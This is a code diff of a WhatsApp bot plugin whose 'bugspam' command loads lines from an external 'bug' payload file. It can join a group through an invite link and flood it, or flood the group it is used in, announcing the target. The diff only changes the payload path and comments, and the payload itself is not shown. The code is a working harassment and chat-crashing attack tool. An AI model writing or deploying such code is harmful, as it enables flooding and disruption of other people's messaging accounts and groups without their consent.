@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../../bug/inconnu3.js'); // Path ou ka modifye selon estrikti ou
+const bugchat = require('../../bug/izuka3.js'); // 🔁 Modified path here
 
 cmd({
   pattern: 'bugspam',
@@ -27,7 +27,7 @@ cmd({
     const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
     const attackLines = bugchat.split('\n').filter(Boolean);
 
-    // Case 1: If DM and invite link sent — join group and spam
+    // Case 1: DM + Group Invite Link
     if (!m.isGroup && isGroupLink) {
       const inviteCode = args[0].split('/')[3];
       try {
@@ -46,7 +46,7 @@ cmd({
       return;
     }
 
-    // Case 2: If used inside a group — spam group directly
+    // Case 2: Used directly inside a group
     if (m.isGroup) {
       await izuka.sendMessage(from, {
         text: `🚨 *BUGSPAM ACTIVATED*\n🧨 Target: ${from}\n💬 Messages: ${attackLines.length}`
